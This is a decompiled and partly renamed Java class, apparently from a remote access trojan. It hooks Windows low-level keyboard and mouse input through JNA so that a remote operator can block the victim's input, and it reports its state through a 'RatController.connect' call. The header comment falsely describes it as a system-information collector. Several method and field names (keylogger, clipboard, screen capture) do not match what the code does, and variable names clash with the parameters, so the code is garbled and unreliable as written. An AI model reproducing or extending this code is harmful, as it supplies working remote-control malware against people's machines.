/*\n * ========================================\n * DEOBFUSCATED: SystemInfo.java\n * Original: a/b.java\n * ----------------------------------------\n * Sistem bilgisi toplayıcı - OS, CPU, RAM, disk bilgileri\n * ========================================\n */\n\n/*
 * Decompiled with CFR 0.152.
 */
package a;

import a.c;
import a.g;
import com.sun.jna.Pointer;
import com.sun.jna.Structure;
import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.User32;
import com.sun.jna.platform.win32.WinDef;
import com.sun.jna.platform.win32.WinUser;

public final class b {
    private static volatile boolean clipboardMonitor = false;
    private static volatile boolean keylogMonitor = false;
    private static volatile boolean monitorActive = false;
    private static volatile int captureInterval = 0;
    private static Thread monitorThread;
    private static WinUser.HHOOK f;
    private static WinUser.HHOOK g;
    private static final WinUser.LowLevelMouseProc h;
    private static final WinUser.LowLevelKeyboardProc i;

    private static WinDef.LPARAM a(Structure structure) {
        if (structure == null) {
            return new WinDef.LPARAM(0L);
        }
        Pointer pointer = structure.getPointer();
        return new WinDef.LPARAM(Pointer.nativeValue(pointer));
    }

    private b() {
    }

    public static synchronized void startMonitoring(boolean clipboard, boolean keylog) {
        a = bl;
        b = bl2;
        if (bl || bl2) {
            a.b.a();
            try {
                a.c.a.a(bl && bl2);
            }
            catch (Throwable throwable) {}
        } else {
            try {
                a.c.a.a(false);
            }
            catch (Throwable throwable) {
                // empty catch block
            }
            a.b.b();
        }
        try {
            RatController.connect("input_block mouse=" + bl + " keyboard=" + bl2);
        }
        catch (Throwable throwable) {
            // empty catch block
        }
    }

    public static void addKeyEvent(String keyEvent) {
        boolean bl = a.b.a(string, "mouse", false);
        boolean bl2 = a.b.a(string, "keyboard", false);
        if (string != null) {
            String string2 = string.trim().toLowerCase();
            if ("1".equals(string2) || "true".equals(string2) || "all".equals(string2) || "on".equals(string2)) {
                bl = true;
                bl2 = true;
            } else if ("0".equals(string2) || "false".equals(string2) || "off".equals(string2) || "none".equals(string2)) {
                bl = false;
                bl2 = false;
            }
        }
        a.b.a(bl, bl2);
    }

    private static boolean matchesFilter(String key, String value, boolean exact) {
        int n2;
        if (string == null) {
            return bl;
        }
        String string3 = "\"" + string2 + "\":";
        int n3 = string.indexOf(string3);
        if (n3 < 0) {
            return bl;
        }
        for (n2 = n3 + string3.length(); n2 < string.length() && Character.isWhitespace(string.charAt(n2)); ++n2) {
        }
        if (n2 >= string.length()) {
            return bl;
        }
        if (string.regionMatches(true, n2, "true", 0, 4)) {
            return true;
        }
        if (string.regionMatches(true, n2, "false", 0, 5)) {
            return false;
        }
        if (string.charAt(n2) == '1') {
            return true;
        }
        if (string.charAt(n2) == '0') {
            return false;
        }
        return bl;
    }

    private static void startKeyLogger() {
        if (c) {
            return;
        }
        c = true;
        e = new Thread(b::lambda$startPump$0, "sp-input-block");
        e.setDaemon(true);
        e.start();
    }

    private static void startClipboardMonitor() {
        c = false;
        int n2 = d;
        if (n2 != 0) {
            try {
                User32.INSTANCE.PostThreadMessage(n2, 18, new WinDef.WPARAM(0L), new WinDef.LPARAM(0L));
            }
            catch (Throwable throwable) {
                // empty catch block
            }
        }
        a.b.c();
        Thread thread = e;
        e = null;
        if (thread != null) {
            try {
                thread.join(500L);
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
    }

    private static void startScreenCapture() {
        try {
            if (f != null) {
                User32.INSTANCE.UnhookWindowsHookEx(f);
                f = null;
            }
        }
        catch (Throwable throwable) {
            // empty catch block
        }
        try {
            if (g != null) {
                User32.INSTANCE.UnhookWindowsHookEx(g);
                g = null;
            }
        }
        catch (Throwable throwable) {
            // empty catch block
        }
    }

    private static WinDef.LRESULT lambda$static$1(int n2, WinDef.WPARAM wPARAM, WinUser.KBDLLHOOKSTRUCT kBDLLHOOKSTRUCT) {
        if (n2 >= 0 && b) {
            return new WinDef.LRESULT(1L);
        }
        return User32.INSTANCE.CallNextHookEx(g, n2, wPARAM, a.b.a(kBDLLHOOKSTRUCT));
    }

    private static WinDef.LRESULT lambda$static$0(int n2, WinDef.WPARAM wPARAM, WinUser.MSLLHOOKSTRUCT mSLLHOOKSTRUCT) {
        if (n2 >= 0 && a) {
            return new WinDef.LRESULT(1L);
        }
        return User32.INSTANCE.CallNextHookEx(f, n2, wPARAM, a.b.a(mSLLHOOKSTRUCT));
    }

    private static void lambda$startPump$0() {
        try {
            d = Kernel32.INSTANCE.GetCurrentThreadId();
            WinDef.HMODULE hMODULE = Kernel32.INSTANCE.GetModuleHandle(null);
            f = User32.INSTANCE.SetWindowsHookEx(14, h, hMODULE, 0);
            g = User32.INSTANCE.SetWindowsHookEx(13, i, hMODULE, 0);
            WinUser.MSG mSG = new WinUser.MSG();
            while (c) {
                int n2 = User32.INSTANCE.GetMessage(mSG, null, 0, 0);
                if (n2 <= 0) {
                    break;
                }
                User32.INSTANCE.TranslateMessage(mSG);
                User32.INSTANCE.DispatchMessage(mSG);
            }
        }
        catch (Throwable throwable) {
            try {
                RatController.connect("InputBlock pump error: " + throwable.getMessage());
            }
            catch (Throwable throwable2) {
                // empty catch block
            }
        }
        finally {
            a.b.c();
            c = false;
            d = 0;
        }
    }

    static {
        h = b::lambda$static$0;
        i = b::lambda$static$1;
    }
}

